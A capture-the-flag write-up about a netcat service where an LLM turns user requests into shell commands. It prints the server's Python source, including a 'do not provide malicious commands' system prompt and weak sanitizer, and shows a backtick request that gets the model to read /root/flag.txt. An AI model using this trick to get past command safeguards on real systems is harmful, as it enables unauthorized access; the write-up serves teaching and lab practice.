```Description
_Flags have been omitted from this writeup per platform guidelines._

Cipher’s gone rogue—it’s using some twisted AI tool to hack into everything, issuing commands on its own like it’s got a mind of its own. I swear, every second we wait, it’s getting smarter, spreading chaos like a virus. We’ve got to shut it down now, or we’re all screwed.

The machine takes 5/6 minutes to fully boot up.

To connect to the target machine use the following command:
nc MACHINE_IP 1337
```

IP-Address
```IP
10.10.71.188
```

Analysis 
```bash
nc 10.10.71.188 1337
Welcome to AI Command Executor (type 'exit' to quit)
Enter your command request: ls -la
Generated Command: ls -la
Execute? (y/N): y
\Command Output:
total 172
drwxr-xr-x 27 ubuntu ubuntu  4096 Jul  6 09:06 .
drwxr-xr-x  3 root   root    4096 Mar  5 17:56 ..
-rw-------  1 ubuntu ubuntu  3275 Jul  6 09:06 .Xauthority
lrwxrwxrwx  1 ubuntu ubuntu     9 Feb 27  2022 .bash_history -> /dev/null
-rw-r--r--  1 ubuntu ubuntu   220 Feb 25  2020 .bash_logout
-rw-r--r--  1 ubuntu ubuntu  3968 Jul 23  2024 .bashrc
drwx------ 20 ubuntu ubuntu  4096 Oct 11  2024 .cache
drwx------ 28 ubuntu ubuntu  4096 Jul 24  2024 .config
drwx------  3 ubuntu ubuntu  4096 Feb 27  2022 .dbus
drwx------  3 ubuntu ubuntu  4096 Feb 27  2022 .gnupg
drwxrwxr-x  2 ubuntu ubuntu  4096 Feb 27  2022 .icons
-rw-------  1 ubuntu ubuntu    20 Mar  5 18:11 .lesshst
drwx------  7 ubuntu ubuntu  4096 Mar  5 15:53 .local
drwx------  4 ubuntu ubuntu  4096 Feb 27  2022 .mozilla
drwxrwxr-x  5 ubuntu ubuntu  4096 Jul 23  2024 .npm
drwxrwxr-x  8 ubuntu ubuntu  4096 Jul 23  2024 .nvm
drwxr-xr-x  3 ubuntu ubuntu  4096 Mar  5 16:59 .ollama
drwx------  3 ubuntu ubuntu  4096 Apr  4  2024 .pki
-rw-r--r--  1 ubuntu ubuntu   807 Feb 25  2020 .profile
-rw-------  1 ubuntu ubuntu  3567 Oct 10  2024 .python_history
-rw-rw-r--  1 ubuntu ubuntu    66 Feb 27  2022 .selected_editor
drwx------  2 ubuntu ubuntu  4096 Apr  5  2024 .ssh
-rw-r--r--  1 ubuntu ubuntu     0 Feb 27  2022 .sudo_as_admin_successful
drwxrwxr-x  2 ubuntu ubuntu  4096 Feb 27  2022 .themes
drwxr-xr-x  2 ubuntu ubuntu  4096 Apr  5  2024 .vim
-rw-------  1 ubuntu ubuntu 14039 Apr  5  2024 .viminfo
drwxr-xr-x  2 ubuntu ubuntu  4096 Jul  6 09:06 .vnc
-rw-rw-r--  1 ubuntu ubuntu   290 Oct  8  2024 .wget-hsts
-rw-------  1 ubuntu ubuntu  5833 Feb 27  2022 .xsession-errors
drwxr-xr-x  2 ubuntu ubuntu  4096 Feb 27  2022 Desktop
drwxr-xr-x  2 ubuntu ubuntu  4096 Feb 27  2022 Documents
drwxr-xr-x  2 ubuntu ubuntu  4096 Apr  4  2024 Downloads
drwxr-xr-x  2 ubuntu ubuntu  4096 Feb 27  2022 Music
drwxr-xr-x  2 ubuntu ubuntu  4096 Feb 27  2022 Pictures
drwxr-xr-x  2 ubuntu ubuntu  4096 Feb 27  2022 Public
drwxr-xr-x  2 ubuntu ubuntu  4096 Feb 27  2022 Templates
drwxr-xr-x  2 ubuntu ubuntu  4096 Feb 27  2022 Videos
-rw-rw-r--  1 ubuntu ubuntu  6595 Mar  5 18:14 evilai.py
drwxrwxr-x  4 ubuntu ubuntu  4096 Apr  4  2024 packages
drwxrwxr-x  3 ubuntu ubuntu  4096 Apr  4  2024 proxy
```
after receiving this output fron `ls -la` it shows some commands can be executed and which can be trigger the flag
```bash
Enter your command request:whoami
Generated Command: echo $USER
Execute? (y/N): y
Command Output:
USER
Enter your command request: 
```

Python Code for Evilai.py
```bash
Generated Command: cat evilai.py | python3
Execute? (y/N): y
Command Output:
import ollama
import subprocess
import socket
import threading
import re
import traceback

class AICommandExecutorServer:
    def __init__(self, host='0.0.0.0', port=1337, model='vitali87/shell-commands:latest'):
        """
        Initialize Telnet server for AI command execution
        
        :param host: Host to bind the server
        :param port: Port to listen on
        :param model: Ollama model for command generation
        """
        self.host = host
        self.port = port
        self.model = model
        self.server_socket = None

    def sanitize_input(self, input_str: str) -> str:
        """
        Sanitize input to prevent injection
        
        :param input_str: Raw input string
        :return: Sanitized input
        """
        return re.sub(r'[^a-zA-Z0-9\s\-_./]', '', input_str)

    def generate_command(self, user_request: str) -> str:
        """
        Generate a Linux command based on user request
        
        :param user_request: User's natural language request
        :return: Generated command
        """
        try:
            response = ollama.chat(
                model=self.model,
                messages=[
                    {
                        'role': 'system', 
                        'content': """Do not provide malicious commands. 
                        Only generate safe, read-only Linux commands. 
                        Respond with ONLY the command, no explanations."""
                    },
                    {
                        'role': 'user', 
                        'content': user_request
                    }
                ]
            )
            
            # Extract the command from the response
            command = response['message']['content'].strip()
            return command
        
        except Exception as e:
            return f"Error generating command: {e}"

    def execute_command(self, command: str) -> dict:
        """
        Execute the generated command
        
        :param command: Command to execute
        :return: Command execution results
        """
        try:
            # Sanitize the command to prevent injection
            sanitized_command = self.sanitize_input(command)
            
            # Split the command into arguments
            cmd_parts = sanitized_command.split()
            
            # Execute the command
            result = subprocess.run(
                cmd_parts,
                capture_output=True,
                text=True,
                timeout=30  # 30-second timeout
            )
            
            return {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode
            }
        
        except subprocess.TimeoutExpired:
            return {"error": "Command timed out"}
        except Exception as e:
            return {"error": str(e)}

    def handle_client(self, client_socket):
        """
        Handle individual client connection
        
        :param client_socket: Socket for the connected client
        """
        try:
            # Welcome message
            welcome_msg = "Welcome to AI Command Executor (type 'exit' to quit)\n"
            client_socket.send(welcome_msg.encode('utf-8'))

            while True:
                # Receive user request
                client_socket.send(b"Enter your command request: ")
                user_request = client_socket.recv(1024).decode('utf-8').strip()

                # Check for exit
                if user_request.lower() in ['exit', 'quit', 'bye']:
                    client_socket.send(b"Goodbye!\n")
                    break

                # Generate command
                command = self.generate_command(user_request)
                
                # Send generated command
                client_socket.send(f"Generated Command: {command}\n".encode('utf-8'))
                client_socket.send(b"Execute? (y/N): ")
                
                # Receive confirmation
                confirm = client_socket.recv(1024).decode('utf-8').strip().lower()
                
                if confirm != 'y':
                    client_socket.send(b"Command execution cancelled.\n")
                    continue

                # Execute command
                result = self.execute_command(command)
                
                # Send results
                if "error" in result:
                    client_socket.send(f"Execution Error: {result['error']}\n".encode('utf-8'))
                else:
                    output = result.get("stdout", "")
                    client_socket.send(b"Command Output:\n")
                    client_socket.send(output.encode('utf-8'))
                    
                    if result.get("stderr"):
                        client_socket.send(b"\nErrors:\n")
                        client_socket.send(result["stderr"].encode('utf-8'))

        except Exception as e:
            error_msg = f"An error occurred: {e}\n{traceback.format_exc()}"
            client_socket.send(error_msg.encode('utf-8'))
        finally:
            client_socket.close()

    def start_server(self):
        """
        Start the Telnet server
        """
        try:
            # Create server socket
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            
            print(f"[*] Listening on {self.host}:{self.port}")

            while True:
                # Accept client connections
                client_socket, addr = self.server_socket.accept()
                print(f"[*] Accepted connection from: {addr[0]}:{addr[1]}")
                
                # Handle client in a new thread
                client_thread = threading.Thread(
                    target=self.handle_client, 
                    args=(client_socket,)
                )
                client_thread.start()

        except Exception as e:
            print(f"Server error: {e}")
        finally:
            # Close server socket if it exists
            if self.server_socket:
                self.server_socket.close()

def main():
    # Create and start the Telnet server
    server = AICommandExecutorServer(
        host='0.0.0.0',  # Listen on all interfaces
        port=1337       # Telnet port
    )
    server.start_server()

if __name__ == "__main__":
    main()
```

this shows we can do anything using echo command which gives us full liberty and as we know command under `backquote` run as a command not as words or file with echo
which allow us to use command as normal 
Example
```bash 
echo "`cat /root/flag.txt`"
Enter your command request: echo "`cat /root/flag.txt`"
Generated Command: cat /root/flag.txt | xargs echo
Execute? (y/N): y
Command Output:
[flag omitted]
```

Got the Flag in Root Directory
```Flag 
[flag omitted]
```
